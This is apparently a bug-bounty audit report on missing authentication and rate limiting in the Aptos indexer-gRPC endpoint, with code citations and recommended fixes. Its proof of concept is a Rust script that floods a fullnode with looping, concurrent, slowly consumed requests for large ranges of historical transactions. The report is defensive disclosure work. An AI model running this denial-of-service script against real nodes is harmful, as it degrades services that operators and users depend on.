# Audit Report

## Title
Unauthenticated Access to Arbitrary Historical Versions Enables Resource Exhaustion in Indexer-gRPC Service

## Summary
The Aptos fullnode indexer-gRPC service allows any unauthenticated client to request arbitrary historical transaction versions without access control or rate limiting. This enables resource exhaustion attacks where malicious peers can overwhelm the node with expensive database queries, causing service degradation or crashes.

## Finding Description

The `GetTransactionsFromNode` RPC endpoint in the indexer-grpc-fullnode service accepts requests from any client without authentication or authorization checks. The service processes these requests by fetching historical transactions directly from AptosDB storage, performing expensive I/O operations. [1](#0-0) 

The `starting_version` parameter accepts any u64 value, with the only validation being that it must be set. No check is performed to restrict which peers can access which version ranges. [2](#0-1) 

The gRPC server is instantiated without any authentication interceptor, allowing unrestricted access to all clients.

**Attack Propagation Path:**

1. **Attacker connects** to the exposed indexer-grpc endpoint (default port 50051)
2. **Sends multiple concurrent** `GetTransactionsFromNodeRequest` messages with:
   - Old historical `starting_version` values (e.g., version 1, 100, 1000, etc.)
   - Large `transactions_count` values (up to 20,000 per request via MAX_REQUEST_LIMIT) [3](#0-2) 

3. **Each request spawns** a tokio task that performs expensive database operations: [4](#0-3) 

4. **Storage layer fetches** transaction info, events, write sets, and auxiliary data for each version: [5](#0-4) 

5. **Multiple concurrent requests** from different source IPs can overwhelm the node's I/O subsystem, causing:
   - Disk I/O saturation
   - CPU exhaustion from transaction processing
   - Memory pressure from buffering large result sets
   - Service degradation or crashes

The only protection is pruning-based validation, which only prevents access to already-pruned data: [6](#0-5) 

**Configuration Analysis:**

The `IndexerGrpcConfig` provides no fields for access control, authentication, or per-peer rate limiting: [7](#0-6) 

## Impact Explanation

This vulnerability qualifies as **Medium Severity** under the Aptos bug bounty program criteria:

- **"State inconsistencies requiring intervention"**: If the indexer-grpc service crashes or becomes unresponsive due to resource exhaustion, downstream indexer clients receive incomplete or inconsistent transaction data, requiring manual intervention to restart and resync.

- **Service Availability Impact**: While not directly affecting consensus or validator operations, the indexer-grpc service is a critical component for ecosystem applications relying on historical transaction data. Sustained attacks can render the service unavailable.

- **Resource Exhaustion**: Each historical query triggers disk I/O, CPU processing for transaction conversion, and network bandwidth consumption. An attacker can amplify resource costs by:
  - Requesting old versions with maximum batch sizes (20,000 transactions)
  - Making concurrent requests across multiple connections
  - Targeting nodes with extensive historical data retention

The vulnerability does not meet High severity criteria as it does not directly impact validator consensus performance or cause protocol violations.

## Likelihood Explanation

**High Likelihood** of exploitation due to:

1. **Zero Attack Complexity**: Any network peer can connect to the exposed gRPC endpoint without authentication
2. **Low Resource Requirements**: Attacker needs only basic gRPC client capabilities
3. **No Special Privileges**: No validator keys, stake, or insider access required
4. **Amplification Factor**: Single small request triggers expensive multi-stage processing
5. **Public Exposure**: Default configuration exposes port 50051 without firewall restrictions in standard deployments [8](#0-7) 

## Recommendation

Implement multi-layered access control and rate limiting:

**1. Add Authentication Interceptor:**
```rust
// In runtime.rs
use tonic::service::interceptor;

fn check_auth(req: Request<()>) -> Result<Request<()>, Status> {
    // Verify bearer token or TLS client certificate
    if let Some(token) = req.metadata().get("authorization") {
        // Validate token against allowlist
        if !is_valid_token(token) {
            return Err(Status::unauthenticated("Invalid token"));
        }
    } else {
        return Err(Status::unauthenticated("Missing authorization"));
    }
    Ok(req)
}

// Apply interceptor to server
let svc = FullnodeDataServer::new(server)
    .send_compressed(CompressionEncoding::Zstd)
    .accept_compressed(CompressionEncoding::Zstd)
    .accept_compressed(CompressionEncoding::Gzip);
tonic_server.add_service(interceptor(svc, check_auth))
```

**2. Add Version Range Validation:**
```rust
// In fullnode_data_service.rs, get_transactions_from_node method
let current_version = context.get_latest_ledger_info()?.version();
let min_allowed_version = current_version.saturating_sub(MAX_HISTORICAL_LOOKBACK);

if starting_version < min_allowed_version {
    return Err(Status::invalid_argument(
        format!("Version {} too old, minimum: {}", starting_version, min_allowed_version)
    ));
}
```

**3. Implement Per-Peer Rate Limiting:**
```rust
// Add to IndexerGrpcConfig
pub struct IndexerGrpcConfig {
    // existing fields...
    pub max_requests_per_peer_per_second: Option<u32>,
    pub trusted_peer_allowlist: Vec<String>,
}
```

**4. Add Request Cost Accounting:**
Track cumulative I/O cost per peer and reject requests exceeding quotas.

## Proof of Concept

```rust
// Rust PoC demonstrating resource exhaustion attack
use aptos_protos::internal::fullnode::v1::{
    fullnode_data_client::FullnodeDataClient,
    GetTransactionsFromNodeRequest,
};
use tokio::time::{sleep, Duration};
use tonic::Request;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let endpoint = "http://127.0.0.1:50051"; // Target fullnode
    
    // Spawn multiple concurrent attack tasks
    let mut handles = vec![];
    for i in 0..10 {
        let endpoint = endpoint.to_string();
        handles.push(tokio::spawn(async move {
            let mut client = FullnodeDataClient::connect(endpoint)
                .await
                .expect("Failed to connect");
            
            loop {
                // Request old historical versions with maximum batch size
                let request = Request::new(GetTransactionsFromNodeRequest {
                    starting_version: Some(i * 100_000), // Old versions
                    transactions_count: Some(20_000), // Maximum limit
                });
                
                match client.get_transactions_from_node(request).await {
                    Ok(mut stream) => {
                        // Consume stream slowly to maximize server load
                        while let Ok(Some(_)) = stream.get_mut().message().await {
                            sleep(Duration::from_millis(10)).await;
                        }
                    }
                    Err(e) => println!("Request failed: {:?}", e),
                }
            }
        }));
    }
    
    // Wait for attack threads
    for handle in handles {
        handle.await?;
    }
    
    Ok(())
}
```

**Expected Outcome**: Target fullnode experiences high disk I/O, CPU usage, and memory consumption. Indexer-grpc service becomes unresponsive or crashes. Legitimate indexer clients cannot fetch transaction data.

## Notes

- The vulnerability exists because the indexer-grpc service was designed as an internal data service but is exposed without authentication in default deployments
- HAProxy rate limiting on port 6182 does NOT protect port 50051 (indexer-grpc)
- Network-level bandwidth limits are insufficient protection as the bottleneck is storage I/O, not network throughput
- This is an application-level resource exhaustion vulnerability, distinct from network-layer DoS attacks which are out of scope

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/fullnode_data_service.rs (L67-88)
```rust
    async fn get_transactions_from_node(
        &self,
        req: Request<GetTransactionsFromNodeRequest>,
    ) -> Result<Response<Self::GetTransactionsFromNodeStream>, Status> {
        // Gets configs for the stream, partly from the request and partly from the node config
        let r = req.into_inner();
        let starting_version = match r.starting_version {
            Some(version) => version,
            // Live mode unavailable for FullnodeDataService
            // Enable use_data_service_interface in config to use LocalnetDataService instead
            None => return Err(Status::invalid_argument("Starting version must be set")),
        };
        let processor_task_count = self.service_context.processor_task_count;
        let processor_batch_size = self.service_context.processor_batch_size;
        let output_batch_size = self.service_context.output_batch_size;
        let transaction_channel_size = self.service_context.transaction_channel_size;
        let ending_version = if let Some(count) = r.transactions_count {
            starting_version.saturating_add(count)
        } else {
            u64::MAX
        };

```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/runtime.rs (L108-112)
```rust
                let svc = FullnodeDataServer::new(server)
                    .send_compressed(CompressionEncoding::Zstd)
                    .accept_compressed(CompressionEncoding::Zstd)
                    .accept_compressed(CompressionEncoding::Gzip);
                tonic_server.add_service(svc)
```

**File:** storage/storage-interface/src/lib.rs (L56-58)
```rust
// This is last line of defense against large queries slipping through external facing interfaces,
// like the API and State Sync, etc.
pub const MAX_REQUEST_LIMIT: u64 = 20_000;
```

**File:** storage/aptosdb/src/db/aptosdb_reader.rs (L374-389)
```rust
    fn get_transaction_outputs(
        &self,
        start_version: Version,
        limit: u64,
        ledger_version: Version,
    ) -> Result<TransactionOutputListWithProofV2> {
        gauged_api("get_transaction_outputs", || {
            error_if_too_many_requested(limit, MAX_REQUEST_LIMIT)?;

            if start_version > ledger_version || limit == 0 {
                return Ok(TransactionOutputListWithProofV2::new_empty());
            }

            self.error_if_ledger_pruned("Transaction", start_version)?;

            let limit = std::cmp::min(limit, ledger_version - start_version + 1);
```

**File:** storage/aptosdb/src/db/aptosdb_reader.rs (L391-420)
```rust
            let (txn_infos, txns_and_outputs, persisted_aux_info) = (start_version
                ..start_version + limit)
                .map(|version| {
                    let txn_info = self
                        .ledger_db
                        .transaction_info_db()
                        .get_transaction_info(version)?;
                    let events = self.ledger_db.event_db().get_events_by_version(version)?;
                    let write_set = self.ledger_db.write_set_db().get_write_set(version)?;
                    let txn = self.ledger_db.transaction_db().get_transaction(version)?;
                    let auxiliary_data = self
                        .ledger_db
                        .transaction_auxiliary_data_db()
                        .get_transaction_auxiliary_data(version)?
                        .unwrap_or_default();
                    let txn_output = TransactionOutput::new(
                        write_set,
                        events,
                        txn_info.gas_used(),
                        txn_info.status().clone().into(),
                        auxiliary_data,
                    );
                    let persisted_aux_info = self
                        .ledger_db
                        .persisted_auxiliary_info_db()
                        .get_persisted_auxiliary_info(version)?
                        .unwrap_or(PersistedAuxiliaryInfo::None);
                    Ok((txn_info, (txn, txn_output), persisted_aux_info))
                })
                .collect::<Result<Vec<_>>>()?
```

**File:** storage/aptosdb/src/db/aptosdb_internal.rs (L261-271)
```rust
    pub(super) fn error_if_ledger_pruned(&self, data_type: &str, version: Version) -> Result<()> {
        let min_readable_version = self.ledger_pruner.get_min_readable_version();
        ensure!(
            version >= min_readable_version,
            "{} at version {} is pruned, min available version is {}.",
            data_type,
            version,
            min_readable_version
        );
        Ok(())
    }
```

**File:** config/src/config/indexer_grpc_config.rs (L31-59)
```rust
#[derive(Clone, Deserialize, PartialEq, Eq, Serialize)]
#[serde(default, deny_unknown_fields)]
pub struct IndexerGrpcConfig {
    pub enabled: bool,

    /// If true, the GRPC stream interface exposed by the data service will be used
    /// instead of the standard fullnode GRPC stream interface. In other words, with
    /// this enabled, you can use an indexer fullnode like it is an instance of the
    /// indexer-grpc data service (aka the Transaction Stream Service API).
    pub use_data_service_interface: bool,

    /// The address that the grpc server will listen on.
    pub address: SocketAddr,

    /// Number of processor tasks to fan out
    pub processor_task_count: Option<u16>,

    /// Number of transactions each processor will process
    pub processor_batch_size: u16,

    /// Number of transactions returned in a single stream response
    pub output_batch_size: u16,

    /// Size of the transaction channel buffer for streaming.
    pub transaction_channel_size: usize,

    /// Maximum size in bytes for transaction filters.
    pub max_transaction_filter_size_bytes: usize,
}
```

**File:** docker/compose/validator-testnet/docker-compose.yaml (L41-43)
```yaml
    ports:
      - "8080:8080" # REST API
      - "50051:50051" # Indexer GRPC, if enabled
```
